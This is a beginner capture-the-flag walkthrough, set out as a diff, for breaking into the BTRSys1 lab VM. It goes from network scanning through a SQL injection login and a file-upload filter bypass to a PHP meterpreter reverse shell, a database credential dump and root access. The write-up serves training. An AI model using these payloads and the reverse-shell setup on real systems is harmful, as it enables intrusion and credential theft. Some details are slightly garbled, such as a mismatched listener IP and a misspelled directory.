@@ -1,0 +1,81 @@
+
+Hack the BTRSys1 VM (Boot2Root Challenge)
+
+BTRSys v1 is another lab by ‘ismailonderkaya’ in the series BTRSys. This lab helps you sharpen your skills as a pentester. It is a must lab for a beginner.
+Difficulty level: Beginner
+WalkThrough
+Let’s start with finding our target as always by using the following command:
+netdiscover
+
+Now as we know our target is 192.168.0.105. Let’s use nmap on it. We all know nmap has many type of scans but aggression scan is much better as it combine and gives all the information at once.
+nmap -A 192.168.0.105
+
+Through nmap we know that port 21, 22 and 80 are open with the services of FTP, SSH and HTTP respectively. As nmap hasn’t told us much; we shall dig deeper by using nikto. Nikto is open-source web server scanner which allows you look for dangerous files/programs, outdated versions, index files, http server options, etc. to use nikto type :
+nikto -h http://192.168.0.105 
+
+With the help of nikto we know that there is login page à /login.php
+Let’s go the login page by typing the following in URL:
+192.168.0.105/login.php
+
+So now we in on login page but we do not have credentials to log in. Let’s check its page source.
+
+Now in the page source if you observe the function control carefully, you’ll realise that username ends with @btrisk.com so, therefore we can use SQL injection here and for that use the following steps:
+Use bruteforce to apply SQL injection. (When asked for text file for bruteforce, select the one with the list of all sql injection commands)
+
+After the completion of brute force it will give the correct sql code which will help you login as shown in above image.
+
+ 
+Right click on that code and select ‘Show response in browser’ as shown above. This will open the browser and you will find yourself automatically logged in.
+Login Details :  @btrisk.com   ‘ or “=’
+
+As we are logged in, there is an option to upload a file. Here, we can upload our malicious php code. To generate the code go to the terminal of kali and type:
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.105 lport=4444 -f raw
+
+Copy the code from <?php to die(); and save it in .txt file. After saving change the extension from .txt to .php and then upload it.
+
+When you try to upload your .php file it will show that only jpg and png files can be uploaded. Okay! So now change the extension from .php to .jpg and then upload it but when you upload it remember to capture the request in burpsuite.
+
+Once the request is captured in BurpSuite, change the file extension from .jpg back to .php and forward the request. This way your malicious .php code will be uploaded on the web application.
+
+Our malicious file I s uploaded but we yet have to find the directory where it was uploaded so we can execute it and have our session. Therefore, next we will use DIRB. And for that type:
+dirb http://192.168.0.105
+
+Dirb has shown us that there is a directory named uploads so obviously there our file has been uploaded. To execute the file type the following in the URL:
+192.168.0.105/uploadsd/shell.php
+
+Like always before executing the file remember to activate your handler on Metasploit so that you can have your session. And for this open Metasploit and type:
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.162.0.107
+set lport 4444
+exploit
+After the handler is activated and your file is executed; you will have your meterpreter session. Let’s then further check system information and for that type:
+sysinfo
+
+Now that we have meterpreter session let’s explore a bit and look into html files:
+cd /var/www/html
+ls
+There is a config.php file in var/www/html. This file has often proven to be important so let’s check it out.
+cat config.php
+
+Through config.php we know that one of the following words is a username and password :
+root
+toor
+deneme
+Let’s now go to shell and try to log in through these three keywords :
+shell 
+mysql -uroot -p -Ddeneme
+And then enter password toor
+Once logged in let’s look for tables by using following command :
+show tables;
+
+As shown in above image there is table named user. Let’s see what this table has :
+select * from user;
+
+From the table we now know that password for root is asd123***. Let’s log in from it :
+su root
+asd123***
+Let’s confirm our root access :
+whoami
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
